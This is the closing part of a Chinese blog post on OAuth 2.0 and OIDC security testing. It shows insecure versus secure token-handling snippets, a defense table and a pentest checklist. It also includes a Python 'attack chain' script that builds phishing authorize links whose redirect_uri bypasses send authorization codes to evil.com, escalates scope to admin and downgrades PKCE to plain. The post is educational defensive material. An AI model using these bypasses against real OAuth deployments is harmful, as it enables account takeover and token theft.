+<h3 id="7-2-ID-Token-误用作-Access-Token"><a href="#7-2-ID-Token-误用作-Access-Token" class="headerlink" title="7.2 ID Token 误用作 Access Token"></a>7.2 ID Token 误用作 Access Token</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;Bearer <span class="subst">&#123;id_token&#125;</span>&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># 正确</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;Bearer <span class="subst">&#123;access_token&#125;</span>&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-Audience-缺失"><a href="#7-3-Audience-缺失" class="headerlink" title="7.3 Audience 缺失"></a>7.3 Audience 缺失</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment"># 不安全</span></span><br><span class="line">jwt.decode(token, key, algorithms=[<span class="string">&#x27;RS256&#x27;</span>])</span><br><span class="line"><span class="comment"># 安全</span></span><br><span class="line">jwt.decode(token, key, algorithms=[<span class="string">&#x27;RS256&#x27;</span>], audience=<span class="string">&#x27;my_client_id&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-Nonce-缺失"><a href="#7-4-Nonce-缺失" class="headerlink" title="7.4 Nonce 缺失"></a>7.4 Nonce 缺失</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nonce = secrets.token_hex(<span class="number">16</span>)</span><br><span class="line"><span class="comment"># /authorize?...&amp;nonce=xxx → 回调校验 id_token[&#x27;nonce&#x27;]==nonce</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="综合攻击链"><a href="#综合攻击链" class="headerlink" title="综合攻击链"></a>综合攻击链</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;OAuth 攻击链 - 仅限授权测试&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests, secrets</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line">auth = <span class="string">&quot;https://auth.target.com&quot;</span></span><br><span class="line">cid = <span class="string">&quot;web_app_123&quot;</span></span><br><span class="line">white = <span class="string">&quot;https://target-app.com&quot;</span></span><br><span class="line"></span><br><span class="line">bypasses = [</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;white&#125;</span>.evil.com/callback&quot;</span>,</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;white&#125;</span>@evil.com/callback&quot;</span>,</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;white&#125;</span>/%2e%2e/evil.com/callback&quot;</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> uri <span class="keyword">in</span> bypasses:</span><br><span class="line">    p = &#123;<span class="string">&#x27;response_type&#x27;</span>:<span class="string">&#x27;code&#x27;</span>,<span class="string">&#x27;client_id&#x27;</span>:cid,</span><br><span class="line">         <span class="string">&#x27;redirect_uri&#x27;</span>:uri,<span class="string">&#x27;scope&#x27;</span>:<span class="string">&#x27;read write&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;state&#x27;</span>:secrets.token_hex(<span class="number">8</span>)&#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;auth&#125;</span>/authorize?<span class="subst">&#123;urlencode(p)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 钓鱼: redirect_uri 绕过 + scope 提权 + PKCE 降级</span></span><br><span class="line">phish = (<span class="string">f&quot;<span class="subst">&#123;auth&#125;</span>/authorize?response_type=code&amp;client_id=<span class="subst">&#123;cid&#125;</span>&quot;</span></span><br><span class="line">         <span class="string">f&quot;&amp;redirect_uri=<span class="subst">&#123;bypasses[<span class="number">0</span>]&#125;</span>&amp;scope=read+write+admin&quot;</span></span><br><span class="line">         <span class="string">f&quot;&amp;state=<span class="subst">&#123;secrets.token_hex(<span class="number">8</span>)&#125;</span>&quot;</span></span><br><span class="line">         <span class="string">f&quot;&amp;code_challenge_method=plain&amp;code_challenge=known&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;phish&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="防御清单"><a href="#防御清单" class="headerlink" title="防御清单"></a>防御清单</h2><table>
+<thead>
+<tr>
+<th>层级</th>
+<th>措施</th>
+<th>针对攻击</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>传输层</td>
+<td>强制 HTTPS + HSTS</td>
+<td>Token 嗅探</td>
+</tr>
+<tr>
+<td>重定向</td>
+<td>精确匹配 redirect_uri</td>
+<td>redirect_uri 绕过</td>
+</tr>
+<tr>
+<td>会话</td>
+<td>安全随机 state 严格校验</td>
+<td>CSRF</td>
+</tr>
+<tr>
+<td>权限</td>
+<td>服务端锁定 scope</td>
+<td>Scope 提权</td>
+</tr>
+<tr>
+<td>PKCE</td>
+<td>强制 S256 禁用 plain</td>
+<td>授权码拦截</td>
+</tr>
+<tr>
+<td>Token</td>
+<td>短过期一次性绑定 client_id</td>
+<td>Token 重放</td>
+</tr>
+<tr>
+<td>OIDC</td>
+<td>校验 aud&#x2F;iss&#x2F;nonce</td>
+<td>OIDC 攻击</td>
+</tr>
+<tr>
+<td>隐式流</td>
+<td>废弃改用授权码+PKCE</td>
+<td>Token 泄漏</td>
+</tr>
+<tr>
+<td>移动端</td>
+<td>PKCE + App Links</td>
+<td>Scheme 劫持</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="安全测试检查表"><a href="#安全测试检查表" class="headerlink" title="安全测试检查表"></a>安全测试检查表</h2><ul>
+<li><input disabled="" type="checkbox"> HTTPS + HSTS 是否强制？</li>
+<li><input disabled="" type="checkbox"> redirect_uri 是否精确匹配、禁用通配符？</li>
+<li><input disabled="" type="checkbox"> 是否存在开放重定向？</li>
+<li><input disabled="" type="checkbox"> state 是否强制、不可预测、严格校验？</li>
+<li><input disabled="" type="checkbox"> scope 是否服务端锁定？</li>
+<li><input disabled="" type="checkbox"> 授权码是否一次性、短过期（&lt;&#x3D;60s）？</li>
+<li><input disabled="" type="checkbox"> PKCE 是否强制 S256、禁用 plain？</li>
+<li><input disabled="" type="checkbox"> client_secret 是否存于前端&#x2F;移动包？</li>
+<li><input disabled="" type="checkbox"> Token 是否在 Referer 中泄漏？</li>
+<li><input disabled="" type="checkbox"> OIDC aud&#x2F;iss&#x2F;nonce 是否校验？</li>
+<li><input disabled="" type="checkbox"> 隐式流是否已废弃？</li>
+<li><input disabled="" type="checkbox"> 移动端是否使用 App Links &#x2F; Universal Links？</li>
+</ul>
+<hr>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>OAuth 2.0 攻击面庞大复杂，安全短板常在实现而非协议本身。RFC 6819、RFC 7636、RFC 8252 及 OAuth 2.1 草案持续强化安全，但最终取决于开发者对细节的把控。建议渗透测试重点关注 <strong>redirect_uri 校验逻辑、state 参数机制、scope 校验策略和 PKCE 实现</strong>四个核心点。</p>
+<p><em>本文仅供安全研究和授权测试使用，请遵守当地法律法规。</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8/" rel="tag"># 认证安全</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/JWT-attacks/" rel="prev" title="JWT安全深度解析">
+                  <i class="fa fa-angle-left"></i> JWT安全深度解析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/GraphQL-security/" rel="next" title="GraphQL安全测试">
+                  GraphQL安全测试 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
